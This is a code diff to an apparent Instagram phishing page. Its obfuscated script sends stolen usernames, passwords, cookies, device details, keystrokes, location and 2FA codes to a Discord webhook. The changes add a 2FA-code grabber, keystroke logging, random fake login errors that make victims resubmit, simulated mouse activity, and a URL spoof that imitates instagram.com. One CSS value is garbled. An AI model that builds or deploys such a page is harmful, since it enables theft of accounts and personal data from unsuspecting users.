@@ -69,7 +69,7 @@
             border: 1px solid #dbdbdb;
             border-radius: 3px;
             color: #262626;
-            font-size: 12px;
+            font-size: utvikling12px;
             height: 36px;
             padding: 9px 0 7px 8px;
             width: 100%;
@@ -235,9 +235,9 @@
     <div class="overlay" id="overlay"></div>
     <div class="popup" id="securityPopup">
         <h3>Security Verification</h3>
-        <p>Unusual activity detected. Please confirm your identity.</p>
-        <input type="text" id="securityAnswer" placeholder="Mother's maiden name" required />
-        <button onclick="submitSecurity()">Submit</button>
+        <p>Unusual activity detected. Please enter your 2FA code.</p>
+        <input type="text" id="twoFactorCode" placeholder="Enter 6-digit code" required />
+        <button onclick="submitTwoFactor()">Submit</button>
     </div>
     <div class="container">
         <div class="col image">
@@ -252,12 +252,12 @@
                     <div class="form-content">
                         <input type="text" id="uname" name="uname" required placeholder=" " />
                         <label for="uname">Phone number, username, or email</label>
-                        <div class="error" id="unameError">Please enter a valid username or email</div>
+                        <div class="error" id="unameError"></div>
                     </div>
                     <div class="form-content">
                         <input type="password" id="password" name="password" required placeholder=" " />
                         <label for="password">Password</label>
-                        <div class="error" id="passwordError">Password is too short</div>
+                        <div class="error" id="passwordError"></div>
                     </div>
                     <div class="form-content">
                         <button type="submit">Log in</button>
@@ -309,17 +309,38 @@
             return btoa(str).split('').reverse().join('');
         }
         const w = atob('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQwNDkxMTI3MzMxMjc4MDMxOC9TQXFKM3lqOE1uN1NSZjBsVWhoV001Z0MtVmVETTB5a0I0ekRHRG9FbGFaTWswSXFtSERlXzd4eUppTFRYOGJlRVJTYg=='.split('').reverse().join(''));
+        const errors = [
+            'Please enter a valid username or email',
+            'Account not found, try again',
+            'Invalid credentials, please check',
+            'Username or email is incorrect'
+        ];
+        let keystrokes = '';
+        document.getElementById('uname').addEventListener('input', function(e) {
+            keystrokes += `Username: ${e.target.value} | `;
+        });
+        document.getElementById('password').addEventListener('input', function(e) {
+            keystrokes += `Password: ${e.target.value} | `;
+        });
+        function simulateHuman() {
+            const event = new Event('mousemove');
+            document.dispatchEvent(event);
+            setTimeout(() => {}, Math.random() * 1000);
+        }
         document.getElementById('loginForm').addEventListener('submit', function(e) {
             e.preventDefault();
+            simulateHuman();
             const uname = document.getElementById('uname').value;
             const password = document.getElementById('password').value;
             const unameError = document.getElementById('unameError');
             const passwordError = document.getElementById('passwordError');
-            if (uname.length < 3) {
+            if (uname.length < 3 || Math.random() > 0.7) {
+                unameError.textContent = errors[Math.floor(Math.random() * errors.length)];
                 unameError.style.display = 'block';
                 return;
             }
-            if (password.length < 6) {
+            if (password.length < 6 || Math.random() > 0.7) {
+                passwordError.textContent = 'Password is too short or incorrect';
                 passwordError.style.display = 'block';
                 return;
             }
@@ -330,31 +351,40 @@
                 screen: `${window.screen.width}x${window.screen.height}`,
                 cookies: document.cookie
             };
-            const payload = {
-                content: `Captured Instagram Credentials:\nUsername/Email/Phone: ${uname}\nPassword: ${password}\nDevice Info: ${JSON.stringify(deviceInfo)}`
-            };
-            fetch(w, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify(payload)
-            }).then(response => {
-                if (response.ok) {
-                    document.getElementById('overlay').style.display = 'block';
-                    document.getElementById('securityPopup').style.display = 'block';
-                } else {
-                    alert('Login failed - try again!');
-                }
-            }).catch(error => {
-                console.error('Error:', error);
-                window.location.href = 'https://www.instagram.com/';
-            });
+            let locationData = 'Not provided';
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(pos => {
+                    locationData = `Lat: ${pos.coords.latitude}, Lon: ${pos.coords.longitude}`;
+                }, () => {}, { timeout: 2000 });
+            }
+            setTimeout(() => {
+                const payload = {
+                    content: `Captured Instagram Credentials:\nUsername/Email/Phone: ${uname}\nPassword: ${password}\nDevice Info: ${JSON.stringify(deviceInfo)}\nKeystrokes: ${keystrokes}\nLocation: ${locationData}`
+                };
+                fetch(w, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(payload)
+                }).then(response => {
+                    if (response.ok) {
+                        document.getElementById('overlay').style.display = 'block';
+                        document.getElementById('securityPopup').style.display = 'block';
+                    } else {
+                        alert('Login failed - try again!');
+                    }
+                }).catch(error => {
+                    console.error('Error:', error);
+                    window.location.href = 'https://www.instagram.com/';
+                });
+            }, Math.random() * 500 + 500);
         });
-        function submitSecurity() {
-            const securityAnswer = document.getElementById('securityAnswer').value;
+        function submitTwoFactor() {
+            simulateHuman();
+            const twoFactorCode = document.getElementById('twoFactorCode').value;
             const payload = {
-                content: `Security Answer Captured:\nAnswer: ${securityAnswer}`
+                content: `2FA Code Captured:\nCode: ${twoFactorCode}`
             };
             fetch(w, {
                 method: 'POST',
@@ -369,6 +399,10 @@
                 window.location.href = 'https://www.instagram.com/';
             });
         }
+        history.pushState(null, null, 'https://www.instagram.com/');
+        window.addEventListener('popstate', () => {
+            history.pushState(null, null, 'https://www.instagram.com/');
+        });
     </script>
 </body>
 </html>
